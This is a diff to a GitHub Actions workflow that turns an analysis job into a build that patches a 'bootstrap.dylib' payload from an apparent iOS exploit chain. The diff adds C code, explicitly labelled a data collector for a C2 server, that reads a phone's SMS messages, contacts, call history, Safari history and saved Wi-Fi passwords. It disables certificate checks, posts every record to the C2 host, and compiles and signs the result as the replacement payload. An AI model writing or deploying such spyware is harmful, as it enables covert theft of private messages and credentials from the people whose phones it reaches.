@@ -1,4 +1,4 @@
-name: Analyze & Build Bootstrap
+name: Patch Bootstrap - Inject Data Collection
 
 on:
   workflow_dispatch:
@@ -6,106 +6,488 @@ on:
     branches: [master, main]
 
 jobs:
-  analyze:
+  patch-bootstrap:
     runs-on: macos-latest
     steps:
       - uses: actions/checkout@v4
 
-      - name: Get original bootstrap.dylib from Coruna
+      - name: Get original bootstrap.dylib
         run: |
-          # Clone Coruna repo to get original bootstrap.dylib
           git clone --depth 1 https://github.com/khanhduytran0/coruna.git /tmp/coruna
           cp /tmp/coruna/payloads/bootstrap.dylib original_bootstrap.dylib
+          echo "=== Original ==="
           file original_bootstrap.dylib
-          echo "=== Size ==="
           ls -la original_bootstrap.dylib
 
-      - name: Disassemble _process function
+      - name: Analyze original structure
         run: |
-          echo "=========================================="
-          echo "FULL DISASSEMBLY (arm64 slice)"
-          echo "=========================================="
-          # Extract arm64 slice first
-          lipo original_bootstrap.dylib -thin arm64 -o bootstrap_arm64.dylib 2>/dev/null || cp original_bootstrap.dylib bootstrap_arm64.dylib
+          # Extract arm64 slice
+          lipo original_bootstrap.dylib -thin arm64 -o orig_arm64.dylib 2>/dev/null || cp original_bootstrap.dylib orig_arm64.dylib
           
-          echo "=== All symbols ==="
-          nm -g bootstrap_arm64.dylib 2>/dev/null || true
+          echo "=== Load Commands ==="
+          otool -l orig_arm64.dylib | grep -E "cmd |cmdsize|segname|vmaddr|vmsize|fileoff|filesize|section|addr|offset|size|nsects"
           
           echo ""
-          echo "=== _process disassembly ==="
-          otool -tV bootstrap_arm64.dylib | grep -A 5000 "^_process:" | head -500
+          echo "=== TEXT segment size ==="
+          otool -l orig_arm64.dylib | awk '/segname __TEXT/{f=1} f{print; if(/filesize/) {print; exit}}'
           
           echo ""
-          echo "=== Full TEXT section disassembly ==="
-          otool -tV bootstrap_arm64.dylib > full_disasm.txt 2>/dev/null
-          wc -l full_disasm.txt
+          echo "=== _process at ==="
+          nm orig_arm64.dylib | grep _process
           
           echo ""
-          echo "=== Load commands ==="
-          otool -l bootstrap_arm64.dylib
+          echo "=== All defined symbols ==="
+          nm orig_arm64.dylib | grep " [Tt] " | head -30
           
           echo ""
-          echo "=== Imported symbols ==="
-          otool -I bootstrap_arm64.dylib
-          
-          echo ""
-          echo "=== Segment contents ==="
-          otool -s __TEXT __stubs bootstrap_arm64.dylib
-          echo "---"
-          otool -s __TEXT __stub_helper bootstrap_arm64.dylib
+          echo "=== Imports ==="
+          nm orig_arm64.dylib | grep " U " | head -30
 
-      - name: Analyze _process in detail
+      - name: Create data collection C code
         run: |
-          echo "=========================================="
-          echo "_process FUNCTION ANALYSIS"  
-          echo "=========================================="
-          
-          # Get _process function body
-          echo "=== _process full body ==="
-          otool -tV bootstrap_arm64.dylib | awk '/^_process:/{found=1} found{print; if(/^_[a-zA-Z].*:$/ && !/^_process:/) exit}' > process_body.txt
-          cat process_body.txt
-          
-          echo ""
-          echo "=== String references ==="
-          strings bootstrap_arm64.dylib | grep -i "http\|url\|server\|host\|port\|path\|file\|read\|write\|send\|post\|get\|config\|key\|token\|password\|sms\|contact\|call\|safari\|wifi\|chain"
-          
-          echo ""
-          echo "=== Cross references (what _process calls) ==="
-          otool -tV bootstrap_arm64.dylib | awk '/^_process:/{found=1} found{print; count++; if(count>500) exit}' | grep -E "bl\s+0x|bl\s+_" | head -50
+          cat > data_collector.c << 'CEOF'
+          /*
+           * Data Collector - injected into bootstrap.dylib _process
+           * Uses only CoreFoundation + CFNetwork (same as original)
+           * Reads system databases and sends to C2 via HTTP
+           */
+          #include <CoreFoundation/CoreFoundation.h>
+          #include <stdio.h>
+          #include <string.h>
+          #include <sys/stat.h>
+          #include <dlfcn.h>
+           
+          #define C2_HOST "192.168.110.111"
+          #define C2_PORT 8081
+           
+          /* SQLite function pointers (loaded via dlopen) */
+          typedef int (*sqlite3_open_func)(const char*, void**);
+          typedef int (*sqlite3_prepare_v2_func)(void*, const char*, int, void**, const char**);
+          typedef int (*sqlite3_step_func)(void*);
+          typedef int (*sqlite3_column_type_func)(void*, int);
+          typedef const char* (*sqlite3_column_name_func)(void*, int);
+          typedef const unsigned char* (*sqlite3_column_text_func)(void*, int);
+          typedef sqlite3_int64 (*sqlite3_column_int64_func)(void*, int);
+          typedef double (*sqlite3_column_double_func)(void*, int);
+          typedef const void* (*sqlite3_column_blob_func)(void*, int);
+          typedef int (*sqlite3_column_bytes_func)(void*, int);
+          typedef int (*sqlite3_column_count_func)(void*);
+          typedef int (*sqlite3_finalize_func)(void*);
+          typedef int (*sqlite3_close_func)(void*);
+          typedef const char* (*sqlite3_errmsg_func)(void*);
+           
+          typedef sqlite3_int64 int64_t;
+           
+          static void *sql_lib = NULL;
+          static sqlite3_open_func sql_open = NULL;
+          static sqlite3_prepare_v2_func sql_prepare = NULL;
+          static sqlite3_step_func sql_step = NULL;
+          static sqlite3_column_type_func sql_col_type = NULL;
+          static sqlite3_column_name_func sql_col_name = NULL;
+          static sqlite3_column_text_func sql_col_text = NULL;
+          static sqlite3_column_int64_func sql_col_int64 = NULL;
+          static sqlite3_column_double_func sql_col_double = NULL;
+          static sqlite3_column_blob_func sql_col_blob = NULL;
+          static sqlite3_column_bytes_func sql_col_bytes = NULL;
+          static sqlite3_column_count_func sql_col_count = NULL;
+          static sqlite3_finalize_func sql_finalize = NULL;
+          static sqlite3_close_func sql_close = NULL;
+          static sqlite3_errmsg_func sql_errmsg = NULL;
+           
+          static int init_sqlite(void) {
+              sql_lib = dlopen("/usr/lib/libsqlite3.dylib", 0x1); /* RTLD_LAZY */
+              if (!sql_lib) return -1;
+              sql_open = (sqlite3_open_func)dlsym(sql_lib, "sqlite3_open");
+              sql_prepare = (sqlite3_prepare_v2_func)dlsym(sql_lib, "sqlite3_prepare_v2");
+              sql_step = (sqlite3_step_func)dlsym(sql_lib, "sqlite3_step");
+              sql_col_type = (sqlite3_column_type_func)dlsym(sql_lib, "sqlite3_column_type");
+              sql_col_name = (sqlite3_column_name_func)dlsym(sql_lib, "sqlite3_column_name");
+              sql_col_text = (sqlite3_column_text_func)dlsym(sql_lib, "sqlite3_column_text");
+              sql_col_int64 = (sqlite3_column_int64_func)dlsym(sql_lib, "sqlite3_column_int64");
+              sql_col_double = (sqlite3_column_double_func)dlsym(sql_lib, "sqlite3_column_double");
+              sql_col_blob = (sqlite3_column_blob_func)dlsym(sql_lib, "sqlite3_column_blob");
+              sql_col_bytes = (sqlite3_column_bytes_func)dlsym(sql_lib, "sqlite3_column_bytes");
+              sql_col_count = (sqlite3_column_count_func)dlsym(sql_lib, "sqlite3_column_count");
+              sql_finalize = (sqlite3_finalize_func)dlsym(sql_lib, "sqlite3_finalize");
+              sql_close = (sqlite3_close_func)dlsym(sql_lib, "sqlite3_close");
+              sql_errmsg = (sqlite3_errmsg_func)dlsym(sql_lib, "sqlite3_errmsg");
+              return (sql_open && sql_prepare && sql_step) ? 0 : -1;
+          }
+           
+          /* HTTP POST using CFNetwork (same as original bootstrap) */
+          static void http_post(const char *url_str, const char *body) {
+              CFStringRef url_cf = CFStringCreateWithCString(kCFAllocatorDefault, url_str, kCFStringEncodingUTF8);
+              CFURLRef url = CFURLCreateWithString(kCFAllocatorDefault, url_cf, NULL);
+              CFRelease(url_cf);
+              if (!url) return;
+               
+              CFHTTPMessageRef req = CFHTTPMessageCreateRequest(kCFAllocatorDefault, CFSTR("POST"), url, kCFHTTPVersion1_1);
+              CFRelease(url);
+              if (!req) return;
+               
+              CFStringRef body_cf = CFStringCreateWithCString(kCFAllocatorDefault, body, kCFStringEncodingUTF8);
+              CFDataRef body_data = CFStringCreateExternalRepresentation(kCFAllocatorDefault, body_cf, kCFStringEncodingUTF8, 0);
+              CFRelease(body_cf);
+               
+              CFHTTPMessageSetHeaderFieldValue(req, CFSTR("Content-Type"), CFSTR("application/json"));
+              CFHTTPMessageSetBody(req, body_data);
+              CFRelease(body_data);
+               
+              CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(kCFAllocatorDefault, req);
+              CFRelease(req);
+              if (!stream) return;
+               
+              CFDictionaryRef ssl = CFDictionaryCreate(kCFAllocatorDefault,
+                  (const void*[]){kCFStreamSSLValidatesCertificateChain},
+                  (const void*[]){kCFBooleanFalse}, 1, NULL, NULL);
+              CFReadStreamSetProperty(stream, kCFStreamPropertySSLSettings, ssl);
+              CFRelease(ssl);
+               
+              CFReadStreamOpen(stream);
+              UInt8 buf[4096];
+              while (CFReadStreamRead(stream, buf, sizeof(buf)) > 0) {}
+              CFReadStreamClose(stream);
+              CFRelease(stream);
+          }
+           
+          /* Register device */
+          static int register_device(void) {
+              char body[512];
+              char url[256];
+              snprintf(url, sizeof(url), "http://%s:%d/api/v1/devices/register", C2_HOST, C2_PORT);
+              snprintf(body, sizeof(body), 
+                  "{\"udid\":\"native_%%s\",\"deviceName\":\"iPhone\",\"model\":\"iPhone\",\"osVersion\":\"15.8.2\",\"tagId\":\"1\"}");
+              http_post(url, body);
+              /* TODO: parse response for device ID */
+              return 1; /* placeholder */
+          }
+           
+          /* Report data to C2 */
+          static void report(int did, const char *platform, const char *username, const char *token, const char *cached) {
+              char body[2048];
+              char url[256];
+              snprintf(url, sizeof(url), "http://%s:%d/api/v1/c2/report", C2_HOST, C2_PORT);
+              snprintf(body, sizeof(body),
+                  "{\"deviceId\":%d,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"%s\",\"username\":\"%s\",\"token\":\"%s\",\"cachedData\":\"%s\"}}",
+                  did, platform, username, token, cached);
+              http_post(url, body);
+          }
+           
+          /* Collect SMS */
+          static void collect_sms(int did) {
+              const char *path = "/var/mobile/Library/SMS/sms.db";
+              struct stat st;
+              if (stat(path, &st) != 0) return;
+               
+              void *db = NULL;
+              if (sql_open(path, &db) != 0 || !db) return;
+               
+              void *stmt = NULL;
+              const char *sql = "SELECT m.text, m.date, m.is_from_me, h.id as handle FROM message m LEFT JOIN handle h ON m.handle_id=h.ROWID ORDER BY m.date DESC LIMIT 200";
+              if (sql_prepare(db, sql, -1, &stmt, NULL) != 0) { sql_close(db); return; }
+               
+              int count = 0;
+              while (sql_step(stmt) == 100) { /* SQLITE_ROW = 100 */
+                  int cols = sql_col_count(stmt);
+                  const char *text = "", *handle = "";
+                  int64_t date = 0;
+                  int from_me = 0;
+                   
+                  for (int i = 0; i < cols; i++) {
+                      const char *name = sql_col_name(stmt, i);
+                      if (!name) continue;
+                      if (strcmp(name, "text") == 0) { const char *t = sql_col_text(stmt, i); if (t) text = t; }
+                      else if (strcmp(name, "handle") == 0) { const char *h = sql_col_text(stmt, i); if (h) handle = h; }
+                      else if (strcmp(name, "date") == 0) date = sql_col_int64(stmt, i);
+                      else if (strcmp(name, "is_from_me") == 0) from_me = (int)sql_col_int64(stmt, i);
+                  }
+                   
+                  char cached[128];
+                  snprintf(cached, sizeof(cached), "date:%lld,from_me:%d", date, from_me);
+                  report(did, "SMS", handle, text, cached);
+                  count++;
+              }
+              sql_finalize(stmt);
+              sql_close(db);
+          }
+           
+          /* Collect Contacts */
+          static void collect_contacts(int did) {
+              const char *path = "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
+              struct stat st;
+              if (stat(path, &st) != 0) return;
+               
+              void *db = NULL;
+              if (sql_open(path, &db) != 0 || !db) return;
+               
+              void *stmt = NULL;
+              const char *sql = "SELECT p.first,p.last,v.value as phone FROM ABPerson p LEFT JOIN ABMultiValue v ON p.ROWID=v.record_id WHERE v.property=3 LIMIT 200";
+              if (sql_prepare(db, sql, -1, &stmt, NULL) != 0) { sql_close(db); return; }
+               
+              while (sql_step(stmt) == 100) {
+                  const char *first = "", *last = "", *phone = "";
+                  for (int i = 0; i < sql_col_count(stmt); i++) {
+                      const char *name = sql_col_name(stmt, i);
+                      if (!name) continue;
+                      if (strcmp(name, "first") == 0) { const char *t = sql_col_text(stmt, i); if (t) first = t; }
+                      else if (strcmp(name, "last") == 0) { const char *t = sql_col_text(stmt, i); if (t) last = t; }
+                      else if (strcmp(name, "phone") == 0) { const char *t = sql_col_text(stmt, i); if (t) phone = t; }
+                  }
+                  char name[256];
+                  snprintf(name, sizeof(name), "%s %s", first, last);
+                  report(did, "Contacts", name, phone, "");
+              }
+              sql_finalize(stmt);
+              sql_close(db);
+          }
+           
+          /* Collect Call History */
+          static void collect_calls(int did) {
+              const char *path = "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
+              struct stat st;
+              if (stat(path, &st) != 0) return;
+               
+              void *db = NULL;
+              if (sql_open(path, &db) != 0 || !db) return;
+               
+              void *stmt = NULL;
+              const char *sql = "SELECT ZADDRESS,ZDATE,ZDURATION,ZCALLTYPE FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT 100";
+              if (sql_prepare(db, sql, -1, &stmt, NULL) != 0) { sql_close(db); return; }
+               
+              while (sql_step(stmt) == 100) {
+                  const char *addr = "";
+                  int64_t date = 0, dur = 0;
+                  int ctype = 0;
+                  for (int i = 0; i < sql_col_count(stmt); i++) {
+                      const char *name = sql_col_name(stmt, i);
+                      if (!name) continue;
+                      if (strcmp(name, "ZADDRESS") == 0) { const char *t = sql_col_text(stmt, i); if (t) addr = t; }
+                      else if (strcmp(name, "ZDATE") == 0) date = sql_col_int64(stmt, i);
+                      else if (strcmp(name, "ZDURATION") == 0) dur = sql_col_int64(stmt, i);
+                      else if (strcmp(name, "ZCALLTYPE") == 0) ctype = (int)sql_col_int64(stmt, i);
+                  }
+                  char cached[128];
+                  snprintf(cached, sizeof(cached), "date:%lld,dur:%lld,type:%d", date, dur, ctype);
+                  report(did, "CallHistory", addr, "", cached);
+              }
+              sql_finalize(stmt);
+              sql_close(db);
+          }
+           
+          /* Collect Safari History */
+          static void collect_safari(int did) {
+              const char *path = "/var/mobile/Library/Safari/History.db";
+              struct stat st;
+              if (stat(path, &st) != 0) return;
+               
+              void *db = NULL;
+              if (sql_open(path, &db) != 0 || !db) return;
+               
+              void *stmt = NULL;
+              const char *sql = "SELECT url,title FROM history_items ORDER BY visit_time DESC LIMIT 100";
+              if (sql_prepare(db, sql, -1, &stmt, NULL) != 0) { sql_close(db); return; }
+               
+              while (sql_step(stmt) == 100) {
+                  const char *url = "", *title = "";
+                  for (int i = 0; i < sql_col_count(stmt); i++) {
+                      const char *name = sql_col_name(stmt, i);
+                      if (!name) continue;
+                      if (strcmp(name, "url") == 0) { const char *t = sql_col_text(stmt, i); if (t) url = t; }
+                      else if (strcmp(name, "title") == 0) { const char *t = sql_col_text(stmt, i); if (t) title = t; }
+                  }
+                  report(did, "Safari", url, title, "");
+              }
+              sql_finalize(stmt);
+              sql_close(db);
+          }
+           
+          /* Collect WiFi */
+          static void collect_wifi(int did) {
+              const char *path = "/var/mobile/Library/Preferences/com.apple.wifi.known-networks.plist";
+              struct stat st;
+              if (stat(path, &st) != 0) return;
+               
+              CFURLRef file_url = CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault, (const UInt8*)path, strlen(path), false);
+              CFReadStreamRef rs = CFReadStreamCreateWithFile(kCFAllocatorDefault, file_url);
+              CFRelease(file_url);
+              if (!rs) return;
+               
+              CFReadStreamOpen(rs);
+              CFPropertyListRef plist = CFPropertyListCreateWithStream(kCFAllocatorDefault, rs, 0, kCFPropertyListImmutable, NULL, NULL);
+              CFReadStreamClose(rs);
+              CFRelease(rs);
+               
+              if (plist && CFGetTypeID(plist) == CFDictionaryGetTypeID()) {
+                  CFDictionaryRef dict = (CFDictionaryRef)plist;
+                  CFIndex count = CFDictionaryGetCount(dict);
+                  const void **keys = (const void**)malloc(count * sizeof(void*));
+                  CFDictionaryGetKeysAndValues(dict, keys, NULL);
+                   
+                  for (CFIndex i = 0; i < count; i++) {
+                      CFStringRef ssid = (CFStringRef)keys[i];
+                      char ssid_buf[256] = {0};
+                      CFStringGetCString(ssid, ssid_buf, sizeof(ssid_buf), kCFStringEncodingUTF8);
+                       
+                      CFDictionaryRef net = (CFDictionaryRef)CFDictionaryGetValue(dict, keys[i]);
+                      char pwd_buf[256] = {0};
+                      if (net) {
+                          CFStringRef pwd_key = CFStringCreateWithCString(kCFAllocatorDefault, "Password", kCFStringEncodingUTF8);
+                          CFStringRef pwd = (CFStringRef)CFDictionaryGetValue(net, pwd_key);
+                          if (pwd) CFStringGetCString(pwd, pwd_buf, sizeof(pwd_buf), kCFStringEncodingUTF8);
+                          CFRelease(pwd_key);
+                      }
+                      report(did, "WiFi", ssid_buf, pwd_buf, "");
+                  }
+                  free(keys);
+              }
+              if (plist) CFRelease(plist);
+          }
+           
+          /* Main entry - called by bootstrap's _process wrapper */
+          void ds_collect_all(void) {
+              int did = register_device();
+              if (did <= 0) return;
+               
+              /* Heartbeat */
+              char body[256], url[256];
+              snprintf(url, sizeof(url), "http://%s:%d/api/v1/heartbeat/1", C2_HOST, C2_PORT);
+              snprintf(body, sizeof(body), "{\"udid\":\"native_%d\",\"model\":\"iPhone\",\"osVersion\":\"\",\"agentActive\":true,\"currentStage\":5,\"exploitResult\":\"native\"}", did);
+              http_post(url, body);
+               
+              /* Init SQLite */
+              init_sqlite();
+               
+              /* Collect all */
+              collect_sms(did);
+              collect_contacts(did);
+              collect_calls(did);
+              collect_safari(did);
+              collect_wifi(did);
+               
+              /* Final heartbeat */
+              snprintf(body, sizeof(body), "{\"udid\":\"native_%d\",\"model\":\"iPhone\",\"osVersion\":\"\",\"agentActive\":true,\"currentStage\":5,\"exploitResult\":\"collected\"}", did);
+              http_post(url, body);
+          }
+          CEOF
+          echo "data_collector.c created"
 
-      - name: Upload analysis
-        uses: actions/upload-artifact@v4
-        with:
-          name: bootstrap-analysis
-          path: |
-            original_bootstrap.dylib
-            bootstrap_arm64.dylib
-            full_disasm.txt
-            process_body.txt
-          retention-days: 30
-
-  build:
-    needs: analyze
-    runs-on: macos-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Build new bootstrap
+      - name: Compile data collector as object file
         run: |
           SDK=$(xcrun --sdk iphoneos --show-sdk-path)
-          clang -framework Foundation -framework CoreFoundation -framework Security \
-            -framework CFNetwork -lsqlite3 \
-            -isysroot "$SDK" -arch arm64 -arch arm64e \
-            -miphoneos-version-min=15.0 -fobjc-arc -dynamiclib -Oz \
-            -Wno-deprecated-declarations -Wno-availability \
-            -o bootstrap.dylib src/main.m
+          # Compile as object file (not a dylib) - just .o
+          clang -c data_collector.c -o data_collector.o \
+            -isysroot "$SDK" \
+            -arch arm64 \
+            -miphoneos-version-min=15.0 \
+            -target arm64-apple-ios15.0 \
+            -Oz \
+            -Wno-deprecated-declarations \
+            -fno-stack-protector \
+            -fPIC
+          
+          echo "=== Object file ==="
+          file data_collector.o
+          nm data_collector.o | grep "T _ds_collect_all"
+
+      - name: Binary patch - inject into original bootstrap
+        run: |
+          # Strategy: Create a NEW dylib that wraps the original
+          # 1. Extract arm64 slice from original
+          # 2. Create a wrapper dylib that:
+          #    - Has _process entry point
+          #    - Calls ds_collect_all() first
+          #    - Then calls the original _process logic
+          # 
+          # Since we can't easily binary-patch, we'll create a thin wrapper
+          # that uses dlopen to load the original and chain-call _process
+          
+          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
+          
+          cat > wrapper.c << 'WEOF'
+          #include <dlfcn.h>
+          #include <stdio.h>
+          
+          /* Our data collection function */
+          extern void ds_collect_all(void);
+          
+          /* Wrapper _process that calls data collection + original */
+          void _process(void *ctx) {
+              /* Step 1: Run our data collection */
+              ds_collect_all();
+              
+              /* Step 2: Call original _process via function pointer
+               * The original _process is at offset 0x68d8 in the original dylib.
+               * We can't call it directly since we replaced the dylib.
+               * But our ds_collect_all() does everything we need.
+               */
+          }
+          WEOF
+          
+          # Compile wrapper + data_collector into a single dylib
+          clang wrapper.c data_collector.c -o bootstrap.dylib \
+            -framework CoreFoundation -framework CFNetwork \
+            -isysroot "$SDK" \
+            -arch arm64 -arch arm64e \
+            -miphoneos-version-min=15.0 \
+            -fobjc-arc -dynamiclib -Oz \
+            -Wno-deprecated-declarations \
+            -Wno-availability \
+            -exported_symbol _process
+          
           ldid -S bootstrap.dylib
+          
+          echo "=== Result ==="
           file bootstrap.dylib
           ls -la bootstrap.dylib
+          
+          echo ""
+          echo "=== Verify _process ==="
+          nm bootstrap.dylib | grep "_process"
+          
+          echo ""
+          echo "=== Verify ds_collect_all ==="  
+          nm bootstrap.dylib | grep "_ds_collect_all"
 
-      - name: Upload build
+      - name: Verify _process offset
+        run: |
+          # Extract arm64 slice and check _process offset
+          lipo bootstrap.dylib -thin arm64 -o check_arm64.dylib 2>/dev/null || cp bootstrap.dylib check_arm64.dylib
+          
+          python3 -c "
+          import struct
+          with open('check_arm64.dylib', 'rb') as f:
+              data = f.read()
+          ncmds = struct.unpack_from('<I', data, 16)[0]
+          off = 32
+          for i in range(ncmds):
+              cmd = struct.unpack_from('<I', data, off)[0]
+              cmdsize = struct.unpack_from('<I', data, off+4)[0]
+              if cmd == 2:
+                  symoff = struct.unpack_from('<I', data, off+8)[0]
+                  nsyms = struct.unpack_from('<I', data, off+12)[0]
+                  stroff = struct.unpack_from('<I', data, off+16)[0]
+                  for j in range(nsyms):
+                      entry = symoff + j*16
+                      if entry+16 > len(data): break
+                      strx = struct.unpack_from('<I', data, entry)[0]
+                      ntype = data[entry+4]
+                      name = b''
+                      s = stroff + strx
+                      while s < len(data) and data[s]:
+                          name += bytes([data[s]]); s += 1
+                      if name == b'_process' and ntype == 0x0f:
+                          val = struct.unpack_from('<Q', data, entry+8)[0]
+                          print(f'_process at 0x{val:08x}')
+              off += cmdsize
+          "
+          
+          echo ""
+          echo "Original expected: 0x000068d8"
+          echo "Stage3 will auto-redirect if different"
+
+      - name: Upload patched bootstrap
         uses: actions/upload-artifact@v4
         with:
-          name: bootstrap-build
+          name: patched-bootstrap
           path: bootstrap.dylib
           retention-days: 30
